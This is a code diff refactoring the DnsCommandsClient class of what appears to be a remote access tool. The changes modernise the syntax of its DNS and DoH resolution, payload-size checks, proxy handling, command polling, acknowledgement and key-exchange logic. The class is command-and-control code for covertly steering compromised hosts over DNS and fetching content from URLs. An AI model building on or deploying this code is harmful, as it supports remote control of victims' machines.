@@ -69,14 +69,14 @@ class DnsCommandsClient(Thread):
             if not ns and not self.doh:
                 raise ValueError('NS must be specified')
 
-            if not self.doh and not type(ns) in (list, tuple):
+            if not self.doh and type(ns) not in (list, tuple):
                 ns = ns.split(':')
                 if len(ns) == 1:
                     ns = (ns[0], 53)
                 elif len(ns) == 2:
                     ns = ns[0], int(ns[1])
                 else:
-                    raise ValueError('Invalid NS address: {}'.format(ns))
+                    raise ValueError(f'Invalid NS address: {ns}')
 
             self.ns = ns
             self.ns_proto = ns_proto
@@ -89,19 +89,18 @@ class DnsCommandsClient(Thread):
 
                 if not ns:
                     for known_hostname, known_ip in online.KNOWN_DNS.iteritems():
-                        ns = securedns.SecureDNS.available(
+                        if ns := securedns.SecureDNS.available(
                             known_hostname, False, known_ip
-                        )
-
-                        if ns:
+                        ):
                             self.ns = ns
                             break
 
                     if self.ns is None:
                         # Maybe DNS->IP has changed. Something is better than nothing
                         for known_hostname in online.KNOWN_DNS:
-                            ns = securedns.SecureDNS.available(known_hostname, False)
-                            if ns:
+                            if ns := securedns.SecureDNS.available(
+                                known_hostname, False
+                            ):
                                 self.ns = ns
                                 break
 
@@ -187,21 +186,18 @@ class DnsCommandsClient(Thread):
         elif self.qtype == 'AAAA':
             family = socket.AF_INET6
         else:
-            raise NotImplementedError(
-                '{} is not supported by native resolver'.format(self.qtype)
-            )
+            raise NotImplementedError(f'{self.qtype} is not supported by native resolver')
 
-        return set(
-            addr[0] for af_family, _, _, _, addr in socket.getaddrinfo(
+        return {
+            addr[0]
+            for af_family, _, _, _, addr in socket.getaddrinfo(
                 hostname, 80, family
-            ) if af_family == family
-        )
+            )
+            if af_family == family
+        }
 
     def _doh_resolve(self, hostname):
-        qtype = securedns.AAAA
-        if self.qtype == 'A':
-            qtype = securedns.A
-
+        qtype = securedns.A if self.qtype == 'A' else securedns.AAAA
         return self.ns.resolve(hostname, qtype)
 
     def _dnslib_resolve(self, hostname):
@@ -293,20 +289,18 @@ class DnsCommandsClient(Thread):
         ldata = len(data)
 
         if ldata > 35:
-            # 35 -- limit, 4 - nonce, 1 - version, 4 - CID, 2 - IID, 6 - NODE
-            if CLIENT_VERSION > 1:
-                # Total limit: 52 bytes
-                if (ldata - 35 + 4 + 1 + 4 + 2 + 6 < 35):
-                    data, data_append = data[:35], data[35:]
-                else:
-                    raise PayloadTooBig(
-                        'Page size more than {max_len} bytes ({required_len})',
-                        ldata, 52)
-            else:
+            if CLIENT_VERSION <= 1:
                 raise PayloadTooBig(
                     'Page size more than {max_len} bytes ({required_len})',
                     ldata, 35)
 
+                # Total limit: 52 bytes
+            if ldata < 53:
+                data, data_append = data[:35], data[35:]
+            else:
+                raise PayloadTooBig(
+                    'Page size more than {max_len} bytes ({required_len})',
+                    ldata, 52)
         nonce = self.nonce
         node_block = ''
 
@@ -444,11 +438,7 @@ class DnsCommandsClient(Thread):
     def on_pastelink(self, url, action, encoder):
         proxy = self.proxy
         if type(self.proxy) in (list, tuple):
-            if len(self.proxy) > 0:
-                proxy = self.proxy[0]
-            else:
-                proxy = None
-
+            proxy = self.proxy[0] if len(self.proxy) > 0 else None
         http = tinyhttp.HTTP(proxy=proxy, follow_redirects=True)
         content, code = http.get(url, code=True)
         if code == 200:
@@ -479,11 +469,7 @@ class DnsCommandsClient(Thread):
         try:
             proxy = self.proxy
             if type(self.proxy) in (list, tuple):
-                if len(self.proxy) > 0:
-                    proxy = self.proxy[0]
-                else:
-                    proxy = None
-
+                proxy = self.proxy[0] if len(self.proxy) > 0 else None
             http = tinyhttp.HTTP(
                 proxy=proxy if use_proxy else False,
                 follow_redirects=True
@@ -535,15 +521,12 @@ class DnsCommandsClient(Thread):
             if self.proxy in (None, True, False):
                 self.proxy = []
 
-            if scheme:
-                scheme = scheme.upper()
+            scheme = scheme.upper()
 
             if scheme == 'SOCKS':
                 scheme = 'SOCKS5'
 
-            self.proxy.append(
-                Proxy(scheme, '{}:{}'.format(ip, port), user, password)
-            )
+            self.proxy.append(Proxy(scheme, f'{ip}:{port}', user, password))
 
     def process(self):
         commands = []
@@ -558,16 +541,12 @@ class DnsCommandsClient(Thread):
         else:
             commands = self._request(Poll())
 
-        need_ack = len([
-            x for x in commands if not type(x) in (
-                Poll, Kex, Ack
-            )
-        ])
-
-        if need_ack:
+        if need_ack := len(
+            [x for x in commands if type(x) not in (Poll, Kex, Ack)]
+        ):
             logging.debug('NEED TO ACK: %s', need_ack)
             ack_response = self._request(Ack(need_ack))
-            if not (len(ack_response) == 1 and isinstance(ack_response[0], Ack)):
+            if len(ack_response) != 1 or not isinstance(ack_response[0], Ack):
                 logging.error('ACK <-> ACK failed: received: %s', ack_response)
 
         for command in commands:
@@ -580,7 +559,7 @@ class DnsCommandsClient(Thread):
                     request = self.encoder.generate_kex_request()
                     kex = Kex(request)
                     response = self._request(kex)
-                    if not len(response) == 1 or not isinstance(response[0], Kex):
+                    if len(response) != 1 or not isinstance(response[0], Kex):
                         logging.error('KEX sequence failed. Got %s instead of Kex',
                             response)
                         return
